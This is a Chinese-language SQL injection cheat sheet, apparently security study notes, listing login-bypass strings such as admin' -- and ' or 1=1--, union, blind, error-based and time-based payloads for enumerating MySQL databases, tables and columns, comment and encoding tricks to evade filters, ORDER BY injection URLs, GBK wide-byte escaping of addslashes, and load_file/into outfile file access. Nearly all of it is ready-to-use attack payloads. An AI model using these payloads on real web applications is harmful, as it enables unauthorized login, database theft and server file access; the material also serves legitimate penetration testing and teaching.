# SQL 注入

## 基本概念

* SQL 注入是一种将 SQL 代码插入或添加到应用（用户）的输入参数中，之后再讲这些参数传递给后台的 SQL 服务器加以解析并执行的攻击。
* 攻击者能够修改 SQL 语句，该进程将与执行命令的组件（如数据库服务器、应用服务器或 WEB 服务器）拥有相同的权限。
* 如果 WEB 应用开发人员无法确保在将从 WEB 表单、cookie、输入参数等收到的值传递给 SQL 查询（该查询在数据库服务器上执行）之前已经对其进行过验证，通常就会出现 SQL 注入漏洞。

## 常用工具

* Burp Suite：[Burp Suite 使用介绍](http://static.hx99.net/static/drops/tools-1548.html)
* Tamper Data \(Firefox addon\)
* HackBar \(Firefox addon\)
* sqlmap：[sqlmap 用户手册](http://static.hx99.net/static/drops/tips-143.html)

## 注入常见参数

* `user()`：当前数据库用户；
* `database()`：当前数据库名；
* `version()`：当前使用的数据库版本；
* `@@datadir`：数据库存储数据路径；
* `concat()`：联合数据，用于联合两条数据结果。如 `concat(username,0x3a,password)`；
* `group_concat()`：和 `concat()` 类似，如 `group_concat(DISTINCT+user,0x3a,password)`，用于把多条数据一次注入出来；
* `concat_ws()`：用法类似；
* `hex()` 和 `unhex()`：用于 hex 编码解码；
* `load_file()`：以文本方式读取文件，在 Windows 中，路径设置为 `\\`；
* `select xxoo into outfile '路径'`：权限较高时可直接写文件。


## 语法参考与小技巧

### 行间注释

* `--`

  ```sql
  DROP sampletable;--
  ```

* `#`

  ```sql
  DROP sampletable;#
  ```

### 行内注释

- `/*注释内容*/`

  ```sql
  DROP/*comment*/sampletable`
  DR/**/OP/*绕过过滤*/sampletable`
  SELECT/*替换空格*/password/**/FROM/**/Members
  ```

- `/*! MYSQL专属 */` 

  ```sql
  SELECT /*!32302 1/0, */ 1 FROM tablename
  ```


### 字符串编码

* `ASCII()`：返回字符的 ASCII 码值；
* `CHAR()`：把整数转换为对应的字符。

## 后台万能密码

- `admin' --`
- `admin' #`
- `admin'/*`
- `' or 1=1--`
- `' or 1=1#`
- `' or 1=1/*`
- `') or '1'='1--`
- `') or ('1'='1--`
- 以不同的用户登陆 `' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--`


## 注入语句备忘

### 数据库名

```sql
SELECT database();
SELECT schema_name FROM information_schema.schemata;
```

### 表名

- union 查询

  ```sql
  --MySQL 4版本时用version=9，MySQL 5版本时用version=10
  UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10;
  /* 列出当前数据库中的表 */
  UNION SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database();
  /* 列出所有用户自定义数据库中的表 */
  SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema!='information_schema' AND table_schema!='mysql';
  ```

- 盲注

  ```sql
  AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
  ```

- 报错

  ```sql
  AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)));
  -- 在5.1.5版本中成功。
  ```

### 列名

- union 查询

  ```sql
  UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'tablename'
  ```

- 盲注

  ```sql
  AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'
  ```

- 报错

  ```sql
  -- 在5.1.5版本中成功。 AND (1,2,3) = (SELECT * FROM SOME_EXISTING_TABLE UNION SELECT 1,2,3 LIMIT 1)-- MySQL 5.1版本修复了
  AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT column_name FROM information_schema.columns LIMIT 1)));
  ```

- 利用 `PROCEDURE ANALYSE()`

  ```sql
  -- 这个需要 web 展示页面有你所注入查询的一个字段。
  -- 获得第一个段名 
  SELECT username, permission FROM Users WHERE id = 1; 1 PROCEDURE ANALYSE() 
  -- 获得第二个段名 
  1 LIMIT 1,1 PROCEDURE ANALYSE() 
  -- 获得第三个段名
  1 LIMIT 2,1 PROCEDURE ANALYSE() 
  ```

### 根据列名查询所在的表

```sql
-- 查询字段名为 username 的表
SELECT table_name FROM information_schema.columns WHERE column_name = 'username';
-- 查询字段名中包含 username 的表
SELECT table_name FROM information_schema.columns WHERE column_name LIKE '%user%';
```

### 绕过引号限制

```sql
-- hex 编码
SELECT * FROM Users WHERE username = 0x61646D696E
-- char() 函数
SELECT * FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)
```

### 绕过字符串黑名单

```sql
SELECT 'a' 'd' 'mi' 'n';
SELECT CONCAT('a', 'd', 'm', 'i', 'n');
SELECT CONCAT_WS('', 'a', 'd', 'm', 'i', 'n');
SELECT GROUP_CONCAT('a', 'd', 'm', 'i', 'n');
```

使用 `CONCAT()` 时，任何个参数为 null，将返回 null，推荐使用`CONCAT_WS()`。`CONCAT_WS()`函数第一个参数表示用哪个字符间隔所查询的结果。

### 条件语句

`CASE`, `IF()`, `IFNULL()`, `NULLIF()`. 

```sql
SELECT IF(1=1, true, false);
SELECT CASE WHEN 1=1 THEN true ELSE false END;
```

### 延时函数

`SLEEP()`, `BENCHMARK()`. 

```sql
' - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1('true')), false)) - '
```

### order by 后的注入

`order by` 由于是排序语句，所以可以利用条件语句做判断，根据返回的排序结果不同判断条件的真假。一般带有 `order` 或者 `order by` 的变量很可能是这种注入，在知道一个字段的时候可以采用如下方式注入：

原始链接：`http://www.test.com/list.php?order=vote`

根据 `vote` 字段排序。找到投票数最大的票数 `num` 然后构造以下链接：

```
http://www.test.com/list.php?order=abs(vote-(length(user())>0)*num)+asc
```

看排序是否变化。还有一种方法不需要知道任何字段信息，使用 `rand` 函数：

````
http://www.test.com/list.php?order=rand(true)
http://www.test.com/list.php?order=rand(false)
````

以上两个会返回不同的排序，判断表名中第一个字符是否小于 128 的语句如下：

````
http://www.test.com/list.php?order=rand((select char(substring(table_name,1,1)) from information_schema.tables limit 1)<=128))
````

### 宽字节注入

国内最常使用的 GBK 编码，这种方式主要是绕过 `addslashes` 等对特殊字符进行转移的绕过。反斜杠 `\` 的十六进制为 `%5c`，在你「入」`%bf%27`时，函数遇到单引号自动转移加入 `\`，此时变为 `%bf%5c%27`，`%bf%5c`在 GBK 中变为一个宽字符「縗」。`%bf`那个位置可以是 `%81-%fe` 中间的任何字符。不止在 SQL 注入中，宽字符注入在很多地方都可以应用。

## 参考资料

- [SQL 注入速查表](http://static.hx99.net/static/drops/tips-7840.html)
- [MySQL 注入技巧](http://static.hx99.net/static/drops/tips-7299.html)
- [MySQL 注入科普](http://static.hx99.net/static/drops/tips-123.html)
- [MySQL 注入总结](http://www.91ri.org/4073.html)
- [《SQL 注入攻击与防御》](http://product.dangdang.com/23364650.html)

